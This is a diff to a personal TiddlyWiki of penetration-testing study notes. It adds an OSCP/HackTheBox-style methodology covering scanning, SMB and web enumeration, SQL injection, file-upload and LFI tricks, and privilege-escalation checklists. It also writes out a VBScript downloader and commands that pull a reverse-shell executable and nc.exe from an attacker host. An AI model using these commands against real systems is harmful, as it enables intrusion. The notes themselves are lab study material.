@@ -281,6 +281,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Draft of 'LinEnum'</li>
 
+<li>Draft of 'Penetration Testing Framework'</li>
+
 <li>Entertainment</li>
 
 <li>Exploitation</li>
@@ -9676,7 +9678,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20211027101744341" list="[[Cyber Security]] Pivoting CrappyMakerProgrammer" modified="20211027124130823" title="$:/StoryList">
+<div created="20211027101744341" list="[[Cyber Security]] [[Draft of 'Penetration Testing Framework']] [[Privilege Escalation]] CrappyMakerProgrammer" modified="20211027130410160" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10698,6 +10700,173 @@ Put `docker-compose.yaml` in current directory, then run `docker-compose up`
 </div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
+</div>
+<div created="20210927160738058" draft.of="Penetration Testing Framework" draft.title="Penetration Testing Framework" modified="20211027130408959" title="Draft of 'Penetration Testing Framework'">
+<pre>! Overview
+
+This is a basic Penetration Testing Outline I made
+
+! General Enumeration
+
+!! Port Scanning
+
+Run these commands
+
+```
+nmap -sV -Pn -v &lt;IP Address&gt; # Fast Scanning
+nmap -sV -Pn -v &lt;IP Address&gt; -p- -A -T4 
+```
+
+!! Vulnerability Scanning
+
+```
+nikto -h &lt;Website URL&gt;
+nmap -sV -Pn -v --script vuln &lt;IP Address&gt;
+```
+
+For each service, google the version number and find exploits. also
+
+```
+searchsploit &lt;keyword1&gt; &lt;keyword2&gt; ...
+```
+
+If you find an exploit, add the words &quot;github&quot;, &quot;without metasploit&quot;, &quot;poc&quot; to find code without the need for meterpreter (OSCP)
+
+! Service Enumeration
+
+# For each service
+## Access, Read &amp; Write if possible
+## Using the Version number from scans, find [[Common Vulnerabilities and Exposures]]
+## If You don't know the service (or nmap also doesn't), try web browser
+
+!! DNS Server
+
+Enumerate the host. Use domain names such as those
+
+# Involving the box name, platform and other clues
+## `cronos.htb` : HackTheBox name is `cronos`,
+# Email Address: 
+## `involve@friendzoneportal.red` -&gt; `friendzoneportal.red`
+## Cutting the words, eg. `friendzoneportal.red` -&gt; `friendzone.red`
+
+```
+dig axfr @10.10.10.13 cronos.htb
+```
+
+!! FTP, SMB
+
+[[Network Services]]
+
+For FTP try anonymous login (or credentials if any)
+
+```
+ftp &lt;ip&gt; &lt;port&gt;
+```
+
+For SMB, try Null Shares
+
+```
+IP=10.10.10.123
+smbmap -H $IP # List shares &amp; their permissions
+smbclient -N -L //$IP # List permissions of shares (Null Session)
+nmap --script smb-enum-shares.nse -p445 $IP
+smbclient //&lt;ip&gt;/&lt;share&gt; -N
+enum4linux -a $IP
+```
+
+
+!! Web Hacking
+
+!!! Directory Enumeration
+
+```
+dirb &lt;url&gt;
+gobuster dir -k -x html,js,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u &lt;URL&gt;
+```
+
+Look through at log down everything on everypage. Find all clues.
+
+!!! SQL Injection
+
+# Whenever you find a user page, bruteforce SQL injection payloads.
+## https://github.com/payloadbox/sql-injection-payload-list
+# If it is something like ?id=1, you can try enumerating all the ids by doing id=2, id=3
+## Can move on to SQL Injection (eg. UNION)
+
+!! File Upload Vulnerability
+
+# Upload a file through website/ FTP if possible
+# Access the payload through the web browser to run the php code
+
+To bypass mandate of extension, can try name.php.jpg for example. It will run as a php file [[*|https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload]]
+
+!!! Local File Inclusion
+
+If there is a POST/GET parameter with a path, you can try Directory inclusion by `../../../../../etc/passwd` or something
+
+!!! Content Management Systems
+
+# Vulnerability Scanning
+
+! Exploitation
+
+# [[Password Cracking]]
+# [[OSCP Style Windows Buffer Overflow]]
+# [[Getting Shells]]
+
+! Privilege Escalation
+
+[[Privilege Escalation]]
+
+!! Linux
+
+
+! Post Exploitation
+
+
+# Upload privilege esclation scripts to run
+
+
+!! File Transfers
+
+!!! Windows
+
+```
+echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
+echo Err.Clear &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs
+echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs
+echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs
+echo http.Send &gt;&gt; wget.vbs
+echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs
+echo Set http = Nothing &gt;&gt; wget.vbs
+echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs
+echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs
+echo strData = &quot;&quot; &gt;&gt; wget.vbs
+echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs
+echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
+echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs
+echo Next &gt;&gt; wget.vbs
+echo ts.Close &gt;&gt; wget.vbs
+```
+
+```
+cscript wget.vbs http://10.10.14.12:8000/1234_rev.exe rev.exe
+```
+
+
+```
+powershell -c &quot;wget http://10.10.14.4:8000/nc.exe -Outfile nc.exe&quot;
+```</pre>
 </div>
 <div created="20191105030432236" modified="20191105034127657" title="Entertainment">
 <pre>! Anime &amp; Manga
@@ -11813,8 +11982,23 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 <div created="20211014102800712" modified="20211014102802344" title="Privesc - Linux Binaries">
 <pre>https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</pre>
 </div>
-<div created="20210904164116778" modified="20211025161735263" title="Privilege Escalation">
+<div created="20210904164116778" modified="20211027130438865" title="Privilege Escalation">
 <pre>! Linux
+# Download and run Privilege Escalation scripts
+## [[lse.sh|https://github.com/diego-treitos/linux-smart-enumeration]]: `./lse.sh`, `lse.sh -l1`
+## [[linPEAS.sh|https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS]]
+## [[linEnum.sh||https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh]]
+# If find any binaries exploitable by `sudo -l`, SetUID
+## Go to https://gtfobins.github.io/, or google on how to exploit 
+# Look through the file system
+## For suspicious files/ directories
+### `/home`, `/`
+### `/etc/` (Config Files?), `/opt` (System Scripts?) 
+### `/var/www` (Other website things, for CMS, look through ALL the config files)
+## `find / -name &lt;name of file&gt; 2&gt;/dev/null`
+# For any custom binaries/ scripts, either try
+## Replacing the Script entirely
+## ''Object Injection'', eg. [[Command Injection]], [[Python Injection]]
 
 [[Privesc - Linux Binaries]]
 
@@ -11871,7 +12055,20 @@ netstat -ano
 # Service Escalation
 # Potato Escalation
 # Password Mining Escalation
-# Kernal Exploit</pre>
+# Kernal Exploit
+
+
+
+!! Windows (WIP)
+
+# `systeminfo`
+# `whoami /priv`
+## If got `SeImpersonatePrivilege        Impersonate a client after authentication Enabled `, can try running the Potato Exploit/ [[Churrasco|https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco]] (For Windows  XP/VISTA/2003/2008)
+# Run winPEAS
+# windows-exploit-suggester
+## `python windows-exploit-suggester.py --database 2020-04-04-mssb.xls --systeminfo ~/hackthebox/07-Grandpa/systeminfo.txt`
+# Look for suspicious directories
+## `C:\`, `Program Files`, `Users`</pre>
 </div>
 <div created="20191105065551127" modified="20211018052159274" tags="Tech" title="Programming">
 <pre>! Programming Languages
